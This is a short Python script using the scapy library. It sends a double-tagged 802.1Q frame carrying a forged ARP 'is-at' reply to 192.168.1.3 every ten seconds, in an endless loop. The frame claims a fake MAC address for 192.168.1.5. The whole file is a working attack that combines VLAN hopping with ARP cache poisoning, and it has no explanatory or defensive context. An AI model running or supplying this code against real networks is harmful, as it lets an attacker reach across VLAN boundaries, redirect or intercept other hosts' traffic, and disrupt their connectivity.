import time
from scapy.all import sendp, ARP, Ether, Dot1Q


iface = "Wi-Fi"
target_ip = "192.168.1.3"
fake_ip = "192.168.1.5"
fake_mac = "c0:de:de:ad:be:ef"
our_vlan = 1
target_vlan = 2

packet = Ether()/Dot1Q(vlan=our_vlan)/Dot1Q(vlan=target_vlan)/ARP(hwsrc=fake_mac, pdst=target_ip, psrc=fake_ip, op="is-at")

while True:
    sendp(packet, iface=iface)
    time.sleep(10)